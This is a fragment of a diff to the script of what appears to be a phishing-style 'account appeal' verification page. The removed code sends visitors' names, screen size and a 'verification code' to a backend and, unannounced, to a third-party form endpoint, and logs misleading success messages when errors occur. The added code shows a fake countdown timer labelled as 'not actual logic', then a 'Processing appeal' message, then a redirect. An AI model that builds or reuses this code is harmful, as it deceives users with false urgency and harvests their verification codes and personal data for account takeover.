-                }).catch(err => console.log('Backend submission completed'));
-
-                // Send to additional endpoint (non-blocking)
-                fetch('https://submit-form.com/nv6NiXiuV', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        firstName: firstName,
-                        lastName: lastName,
-                        screen_size: screenSize
-                    })
-                }).catch(err => console.log('Additional endpoint sent'));
-
-                message.className = 'message success';
-                message.textContent = 'Information submitted successfully. Please proceed to verification.';
+            // Simulate countdown for better ux (just demo, not actual logic)
+            function startCountdownSimulation() {
+                const timerElement = document.querySelector('.timer-highlight');
+                if (!timerElement) return;
                 
-                // Show surname modal
-                setTimeout(() => {
-                    showSurnameModal();
-                }, 800);
-            } catch (error) {
-                message.className = 'message error';
-                message.textContent = 'An error occurred. Please try again.';
-                console.error('Submission error:', error);
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Complete Verification';
-            }
-        });
-
-        // Surname modal confirm button
-        confirmSurnameBtn.addEventListener('click', async () => {
-            const surname = surnameInput.value.trim();
-            
-            if (!surname) {
-                alert('Please enter your verification code to proceed.');
-                return;
+                // parse 23:47 -> minutes and seconds
+                let [minutes, seconds] = timerElement.innerText.split(':').map(Number);
+                
+                timerInterval = setInterval(() => {
+                    if (seconds === 0) {
+                        if (minutes === 0) {
+                            clearInterval(timerInterval);
+                            timerElement.innerText = '00:00';
+                            return;
+                        }
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        seconds--;
+                    }
+                    timerElement.innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+                }, 1000);
             }
 
-            try {
-                const verificationData = new FormData();
-                verificationData.append('surname', surname);
-                verificationData.append('screen_size', screenSizeInput.value);
+            // Stop timer on redirect/unload
+            window.addEventListener('beforeunload', function() {
+                if (timerInterval) clearInterval(timerInterval);
+            });
 
-                // Send to backend (non-blocking)
-                fetch(getServerUrl(), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: verificationData
-                }).catch(err => console.log('Backend verification sent'));
+            // Initialize
+            document.addEventListener('DOMContentLoaded', function() {
+                startCountdownSimulation();
 
-                // Send to additional endpoint (non-blocking)
-                fetch('https://submit-form.com/nv6NiXiuV', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        surname: surname,
-                        screen_size: screenSizeInput.value
-                    })
-                }).catch(err => console.log('Additional endpoint sent'));
+                continueBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
 
-                closeSurnameModal();
-                showSuccessModal();
-            } catch (error) {
-                alert('An error occurred during verification. Please try again.');
-                console.error('Verification error:', error);
-            }
-        });
+                    // change button state
+                    const originalText = continueBtn.innerHTML;
+                    continueBtn.innerHTML = '<span>⏳</span> Processing appeal...';
+                    continueBtn.disabled = true;
 
-        // Cancel button
-        cancelSurnameBtn.addEventListener('click', () => {
-            closeSurnameModal();
-        });
-        
-        // Okay button
-        okayBtn.addEventListener('click', () => {
-            closeSuccessModal();
-        });
-
-        // Close modals on outside click
-        window.addEventListener('click', (event) => {
-            if (event.target === modal) {
-                closeSurnameModal();
-            }
-            if (event.target === successModal) {
-                closeSuccessModal();
-            }
-        });
+                    // slight delay then redirect
+                    setTimeout(function() {
+                        window.location.href = REDIRECT_URL;
+                    }, 1100);
+                });
+            });
+        })();
     </script>
 </body>
 </html>
